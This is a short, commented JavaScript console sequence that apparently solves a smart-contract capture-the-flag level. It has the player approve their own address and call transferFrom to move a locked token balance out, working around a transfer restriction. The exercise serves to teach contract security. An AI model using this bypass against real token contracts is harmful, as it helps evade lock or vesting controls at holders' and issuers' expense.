//confirm token balance of player
(await contract.balanceOf(player)).toString()
let balance = await contract.balanceOf(player)

//confirm that the player in the contract matches the player's address
await contract.player() == player

//approve player's address to transfer the whole balance
await contract.approve(player, balance)

//transfer the full balance back to the contract
await contract.transferFrom(player, contract.address, balance)

//confirm token balance of player is 0
(await contract.balanceOf(player)).toString()